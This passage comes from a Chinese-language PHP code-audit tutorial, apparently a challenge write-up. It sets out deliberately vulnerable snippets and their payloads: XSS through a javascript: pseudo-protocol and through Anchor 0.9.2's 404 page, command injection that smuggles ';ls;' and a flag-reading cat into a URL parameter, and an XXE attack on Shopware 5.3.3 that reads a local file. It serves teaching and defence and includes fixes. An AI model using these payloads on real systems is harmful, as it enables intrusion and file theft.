验证电子邮件地址。</li><li><strong>FILTER_VALIDATE_FLOAT</strong>: 验证浮点数。</li><li><strong>FILTER_VALIDATE_INT</strong>: 验证整数。</li><li><strong>FILTER_VALIDATE_IP</strong>: 验证 IP 地址。</li><li><strong>FILTER_VALIDATE_URL</strong>: 验证 URL。</li></ul><p>清理过滤器</p><ul><li><strong>FILTER_SANITIZE_EMAIL</strong>: 清理电子邮件地址（去除所有除字母、数字以及<code>!#$%&amp;&#39;*+-/=?^_</code>{|}~@.[]&#96;之外的字符）。</li><li><strong>FILTER_SANITIZE_NUMBER_INT</strong>: 清理整数（去除所有除数字、加号、减号之外的字符）。</li><li><strong>FILTER_SANITIZE_SPECIAL_CHARS</strong>: 将特殊字符转换为 HTML 实体。</li><li><strong>FILTER_SANITIZE_STRING</strong>: 去除标签并去除或编码特殊字符。</li></ul><p>验证电子邮件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$email</span> = <span class="string">&quot;user@example.com&quot;</span>;</span><br><span class="line">&gt;<span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;This (<span class="subst">&#123;$email&#125;</span>) is a valid email address.&quot;</span>;</span><br><span class="line">&gt;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;This (<span class="subst">&#123;$email&#125;</span>) is not a valid email address.&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>清理字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$string</span> = <span class="string">&quot;&lt;h1&gt;Hello, World!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">&gt;<span class="variable">$sanitized_string</span> = <span class="title function_ invoke__">filter_var</span>(<span class="variable">$string</span>, FILTER_SANITIZE_STRING);</span><br><span class="line">&gt;<span class="keyword">echo</span> <span class="variable">$sanitized_string</span>; <span class="comment">// 输出: Hello, World!</span></span><br></pre></td></tr></table></figure><p>使用选项和标志<br><code>filter_var()</code> 还可以使用第三个参数 <code>$options</code> 来提供额外的指令，比如在验证整数时设置最小和最大值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="string">&quot;options&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">       <span class="string">&quot;min_range&quot;</span> =&gt; <span class="number">1</span>,</span><br><span class="line">       <span class="string">&quot;max_range&quot;</span> =&gt; <span class="number">100</span></span><br><span class="line">   )</span><br><span class="line">&gt;);</span><br><span class="line">&gt;<span class="variable">$number</span> = <span class="number">50</span>;</span><br><span class="line">&gt;<span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$number</span>, FILTER_VALIDATE_INT, <span class="variable">$options</span>)) &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;The number is within the accepted range.&quot;</span>;</span><br><span class="line">&gt;&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;The number is not within the accepted range.&quot;</span>;</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure></blockquote><p>针对这两处的过滤，我们可以考虑使用 <strong>javascript伪协议</strong> 来绕过。为了让大家更好理解，请看下面的demo代码：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-6.png"></p><p>我们使用 <strong>payload</strong> ：<code>?nextSlide=javascript://comment％250aalert(1)</code> ，可以执行 <strong>alert</strong> 函数：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-7.png"><br>实际上，这里的 <strong>&#x2F;&#x2F;</strong> 在JavaScript中表示单行注释，所以后面的内容均为注释，那为什么会执行 <strong>alert</strong> 函数呢？那是因为我们这里用了字符 <strong>%0a</strong> ，该字符为换行符，所以 <strong>alert</strong> 语句与注释符 <strong>&#x2F;&#x2F;</strong> 就不在同一行，就能执行。当然，这里我们要对 <strong>%</strong> 百分号编码成 <strong>%25</strong> ，因为程序将浏览器发来的payload：<code>javascript://comment％250aalert(1)</code> 先解码成： <code>javascript://comment%0aalert(1)</code> 存储在变量 <strong>$url</strong> 中（上图第二行代码），然后用户点击a标签链接就会触发 <strong>alert</strong> 函数。</p><h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>Anchor 0.9.2</strong> 版本，在该版本中，当用户访问一个不存在的URL链接时，程序会调用404模板，而这个模板则存在XSS漏洞，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-8.png"><br>该代码在 <strong>themes\default\404.php</strong> 中，看第4行 <strong>code</strong> 标签中的 <strong>current_url</strong> 函数，我们可在 <strong>anchor\functions\helpers.php</strong> 文件中，看到 <strong>current_url</strong> 函数是由 <strong>Uri</strong> 类的  <strong>current</strong> 方法实现的，具体代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">current_url</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title class_">Uri</span>::<span class="title function_ invoke__">current</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们跟进到 <strong>Uri</strong> 类，在 <strong>system\uri.php</strong> 文件中，我们发现这里调用了 <strong>static::detect</strong> 方法( <strong>statci::</strong> 是在PHP5.3版本之后引入的延迟静态绑定写法)。<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-9.png"></p><p>在 <strong>current</strong> 方法下面，我们就可以找到 <strong>detect</strong> 方法，该方法会获取 <strong>$_SERVER</strong> 数组中的 <strong>‘REQUEST_URI’ 、’PATH_INFO’, 、’ORIG_PATH_INFO’</strong> 三个键的值(下图第3-4行代码)，如果存在其中的某一个键，并且符合 <strong>filter_var($uri, FILTER_SANITIZE_URL)</strong> 和 <strong>parse_url($uri, PHP_URL_PATH)</strong> ，则直接将 <strong>$uri</strong> 传入 <strong>static::format</strong> 方法，下图第10-14行代码，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-10.png"><br>我们跟进 <strong>static::format</strong> 方法，可以发现程序过滤了三次(下图第3-7行)，但是都没有针对XSS攻击进行过滤，只是为了获取用户访问的文件名，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-11.png"><br>由于没有针对XSS攻击进行过滤，导致攻击十分容易，我们来看看XSS攻击具体是如何进行的。<br><strong>漏洞利用</strong><br>我们构造payload如下：  <code>http://localhost/anchor/index.php/&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;/script&gt;</code> 。根据上面的分析，当我们访问这个并不存在的链接时，程序会调用404模板页面，然后调用 <strong>current_url</strong> 函数来获取当前用户访问的文件名，也就是最后一个 <strong>&#x2F;</strong> 符号后面的内容，所以最终payload里的 <code>&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;/script&gt;</code> 部分会嵌入到 <code>&lt;code&gt;</code> 标签中，造成XSS攻击<br><strong>修复建议</strong><br>这对XSS漏洞，我们最好就是过滤关键词，将特殊字符进行HTML实体编码替换，这里给出的修复代码为Dedecms中防御XSS的方法，可以在 <strong>uploads&#x2F;include&#x2F;helpers&#x2F;filter.helper.php</strong> 路径下找到对应代码，具体防护代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-12.png"></p><h3 id="作业题目-1"><a href="#作业题目-1" class="headerlink" title="作业题目"></a>作业题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$url</span>) &amp;&amp; <span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    <span class="variable">$site_info</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="string">&#x27;curl &quot;&#x27;</span>.<span class="variable">$site_info</span>[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; &#x27;</span>, <span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看出来只需要绕过两个部分，第一个是 filter_var 的过滤，第二个是 preg_match 对 url 的判断，是否是以sec-redclub.com结尾。对于filter_var可以用下面的方式绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/index.php?url=http://demo.com@sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com&amp;sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com?sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=http://demo.com/sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=demo://demo.com,sec-redclub.com</span><br><span class="line">http://localhost/index.php?url=demo://demo.com:80;sec-redclub.com:80/</span><br><span class="line">http://localhost/index.php?url=http://demo.com#sec-redclub.com</span><br><span class="line">PS:最后一个payload的#符号，请换成对应的url编码 %23</span><br></pre></td></tr></table></figure><p>接着要绕过 parse_url 函数，并且满足 <code>$site_info[&#39;host&#39;]</code> 的值以 sec-redclub.com 结尾，payload如下：<br><code>http://localhost/index.php?url=demo://%22;ls;%23;sec-redclub.com:80/</code><br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-13.png"><br>当我们直接用 cat f1agi3hEre.php 命令的时候，过不了 filter_var 函数检测，因为包含空格，具体payload如下：<br><code>http://localhost/index.php?url=demo://%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80/</code><br>所以我们可以换成 <code>cat&lt;f1agi3hEre.php</code>命令，即可成功获取flag。</p><h2 id="Snow-Flake"><a href="#Snow-Flake" class="headerlink" title="Snow Flake"></a>Snow Flake</h2><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-14.png"><br><strong>漏洞解析</strong> ：<br>这段代码中存在两个安全漏洞。第一个是文件包含漏洞，上图第8行中使用了 <strong>class_exists()</strong> 函数来判断用户传过来的控制器是否存在，默认情况下，如果程序存在 <strong>__autoload</strong> 函数，那么在使用 <strong>class_exists()</strong> 函数就会自动调用本程序中的 <strong>__autoload</strong> 函数，这题的文件包含漏洞就出现在这个地方。攻击者可以使用 <strong>路径穿越</strong> 来包含任意文件，当然使用路径穿越符号的前提是 <strong>PHP5~5.3(包含5.3版本)版本</strong> 之间才可以。例如类名为： <strong>..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</strong> 的查找，将查看passwd文件内容，我们来看一下PHP手册对 <strong>class_exists()</strong> 函数的定义：</p><blockquote><p><a href="http://php.net/manual/zh/function.class-exists.php"> class_exists </a> ：(PHP 4, PHP 5, PHP 7)</p><p><strong>功能</strong> ：检查类是否已定义</p><p><strong>定义</strong> ： <code>bool class_exists ( string $class_name[, bool $autoload = true ] )</code> </p><p><strong>$class_name</strong> 为类的名字，在匹配的时候不区分大小写。默认情况下 <strong>$autoload</strong> 为 <strong>true</strong> ，当 <strong>$autoload</strong> 为 <strong>true</strong> 时，会自动加载本程序中的 <strong>__autoload</strong> 函数；当 <strong>$autoload</strong> 为 <strong>false</strong> 时，则不调用 <strong>__autoload</strong> 函数。</p></blockquote><p>我们再来说说第二个漏洞。在上图第9行中，我们发现实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 <strong>SimpleXMLElement</strong> 来进行 <strong>XXE</strong> 攻击，进而读取目标文件的内容，甚至命令执行（前提是安装了PHP拓展插件expect），我们来看一下PHP手册对 <strong>SimpleXMLElement</strong> 类的定义：</p><blockquote><p><a href="http://php.net/manual/zh/class.simplexmlelement.php">SimpleXMLElement</a> ：(PHP 5, PHP 7)</p><p><strong>功能</strong> ：用来表示XML文档中的元素，为PHP的内置类。</p></blockquote><p>关于 <strong>SimpleXMLElement</strong> 导致的XXE攻击，下面再给出一个demo案例，方便大家理解：</p><p><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-15.png"></p><h3 id="实例分析-1"><a href="#实例分析-1" class="headerlink" title="实例分析"></a>实例分析</h3><p>本次实例分析，我们选取的是 <strong>Shopware 5.3.3</strong> 版本，对 <strong>SimpleXMLElement</strong> 类导致的 <strong>XXE漏洞</strong> 进行分析，而 <strong>class_exists()</strong> 函数，我们将会在本次给出的CTF题目中深入讨论。我们来看一下本次漏洞的文件，在 <strong>engine\Shopware\Controllers\Backend\ProductStream.php</strong> 文件中有一个 <strong>loadPreviewAction</strong> 方法，其作用是用来预览产品流的详细信息，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-16.png"><br>该方法接收从用户传来的参数 <strong>sort</strong> ，然后传入 <strong>Repository</strong> 类的 <strong>unserialize</strong> 方法（如上图第11-14行代码），我们跟进 <strong>Repository</strong> 类，查看 <strong>unserialize</strong> 方法的实现。该方法我们可以在 <strong>engine\Shopware\Components\ProductStream\Repository.php</strong> 文件中找到，代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-17.png"><br>可以看到 <strong>Repository</strong> 类的 <strong>unserialize</strong> 方法，调用的是 <strong>LogawareReflectionHelper</strong> 类的 <strong>unserialize</strong> 方法（如上图第5行代码），该方法我们可以在 <strong>engine\Shopware\Components\LogawareReflectionHelper.php</strong> 文件中找到，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-18.png"><br>这里的 <strong>$serialized</strong> 就是我们刚刚传入的 <strong>sort</strong> （上图第3行），程序分别从 <strong>sort</strong> 中提取出值赋给 <strong>$className</strong> 和 <strong>$arguments</strong> 变量，然后这两个变量被传入 <strong>ReflectionHelper</strong> 类的 <strong>createInstanceFromNamedArguments</strong> 方法。该方法位于 <strong>engine\Shopware\Components\ReflectionHelper.php</strong> 文件，具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-19.png"><br>这里我们关注 <strong>第6行</strong> 代码，这里创建了一个反射类，而类的名称就是从 <strong>$sort</strong> 变量来的，可被用户控制利用。继续往下看，在代码第28行处用 <strong>$newParams</strong> 作为参数，创建一个新的实例对象。而这里的  <strong>$newParams</strong> 是从 <strong>$arguments[$paramName]</strong> 中取值的， <strong>$arguments</strong> 又是我们可以控制的，因为也是从 <strong>$sort</strong> 变量来，所以我们可以通过这里来实例化一个 <strong>SimpleXMLElement</strong> 类对象，形成一个XXE漏洞。下面，我们来看看具体如何利用这个漏洞。</p><p><strong>漏洞利用</strong><br>首先，我们需要登录后台，找到调用 <strong>loadPreviewAction</strong> 接口的位置，发现其调用位置如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-20.png"><br>当我们点击 <strong>Refresh preview</strong> 按钮时，就会调用 <strong>loadPreviewAction</strong> 方法，用BurpSuite抓到包如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/shopware520/backend/ProductStream/loadPreview?_dc=1530963660916&amp;sort=&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;asc&quot;&#125;&#125;&amp;conditions=&#123;&#125;&amp;shopId=1&amp;currencyId=1&amp;customerGroupKey=EK&amp;page=1&amp;start=0&amp;limit=2</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">X-CSRF-Token</span><span class="punctuation">: </span>IKiwilE7pecuIUmEAJigyg6fVXY6vR</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://localhost/shopware520/backend/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>SHOPWAREBACKEND=78ghtddjn8n8efpv1cudj6eao0; KCFINDER_showname=on; KCFINDER_showsize=off; KCFINDER_showtime=off; KCFINDER_order=name; KCFINDER_orderDesc=off; KCFINDER_view=thumbs; KCFINDER_displaySettings=off; goods[cart]=180615151154565652; XDEBUG_SESSION=PHPSTORM</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><p>我们可以看到 <strong>sort</strong> 值为 <code>&#123;&quot;Shopware\\Bundle\\SearchBundle\\Sorting\\PriceSorting&quot;:&#123;&quot;direction&quot;:&quot;asc&quot;&#125;&#125;</code> ,于是我们按照其格式构造payload： <code>&#123;&quot;SimpleXMLElement&quot;:&#123;&quot;data&quot;:&quot;http://localhost/xxe.xml&quot;,&quot;options&quot;:2,&quot;data_is_url&quot;:1,&quot;ns&quot;:&quot;&quot;,&quot;is_prefix&quot;:0&#125;&#125;</code> ，关于payload的含义，可以看看 <strong>SimpleXMLElement</strong> 类的 <strong>__construct</strong> 函数定义，具体点 <a href="http://php.net/manual/zh/simplexmlelement.construct.php">这里</a> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">public</span> <span class="title class_">SimpleXMLElement</span>::<span class="variable constant_">__construct</span> ( <span class="keyword">string</span> <span class="variable">$data</span> [, <span class="keyword">int</span> <span class="variable">$options</span> = <span class="number">0</span> [, <span class="keyword">bool</span> <span class="variable">$data_is_url</span> = <span class="literal">FALSE</span> [, <span class="keyword">string</span> <span class="variable">$ns</span> = <span class="string">&quot;&quot;</span> [, <span class="keyword">bool</span> <span class="variable">$is_prefix</span> = <span class="literal">FALSE</span> ]]]] )</span><br></pre></td></tr></table></figure><p>笔者所用的xxe.xml内容如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [ </span></span><br><span class="line"><span class="meta">     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/phpStudy/PHPTutorial/WWW/flag.txt&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">x</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">x</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们发送payload，并用xdebug调试程序，最后程序将我们读取的值存储在 <strong>$conditions</strong> 变量中，如下图所示：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-21.png"><br>关于PHP中XXE漏洞的修复，我们可以过滤关键词，如： <strong>ENTITY</strong> 、 <strong>SYSTEM</strong> 等，另外，我们还可以通过禁止加载XML实体对象的方式，来防止XXE漏洞（如下图第2行代码），具体代码如下：<br><img src="/2024/10/02/WebSecurity/codeaudit/phpaudit/image-22.png"><br>我感觉上面实例的利用关键点在于，类的初始化和参数的传递都是我们可控的。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(</span><br><span class="line">function (<span class="variable">$class</span>)&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">NotFound</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$classname</span>))&#123;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$newclass</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$newclass</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$key</span>.<span class="string">&#x27;=&gt;&#x27;</span>.<span class="variable">$value</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>定义一个 <code>NotFound</code> 类<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotFound</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;404&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ul><li>这个 <code>NotFound</code> 类有一个构造函数，该函数调用了 <code>die(&#39;404&#39;);</code>。这意味着当这个类被实例化时，脚本会立即终止并输出 <code>404</code>。这通常用于表示未找到（如页面或资源）。</li></ul><ol start="2"><li>注册一个自动加载函数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">spl_autoload_register</span>(</span><br><span class="line">function (<span class="variable">$class</span>)&#123;</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">NotFound</span>();</span><br><span class="line">&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ol><ul><li><code>spl_autoload_register</code> 函数用于注册任意数量的自动加载器，这些加载器在PHP执行过程中试图使用未定义的类或接口时被调用。</li><li>这里注册的匿名函数在尝试自动加载一个类时创建一个 <code>NotFound</code> 类的实例，因此无论什么类名被请求，都将输出404并终止执行。</li></ul><ol start="3"><li>获取HTTP GET参数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$classname</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param&#x27;</span>] : <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$param2</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>] : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure></li></ol><ul><li>这段代码通过GET请求读取 <code>name</code>、<code>param</code> 和 <code>param2</code> 参数，并将它们保存在变量 <code>$classname</code>、<code>$param</code> 和 <code>$param2</code> 中。如果这些GET参数不存在，则相应的变量被设置为 <code>null</code>。</li></ul><ol start="4"><li>检查类是否存在并实例化<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$classname</span>))&#123;</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">new</span> <span class="variable">$classname</span>(<span class="variable">$param</span>,<span class="variable">$param2</span>);</span><br><span class="line"><span class="title function_ 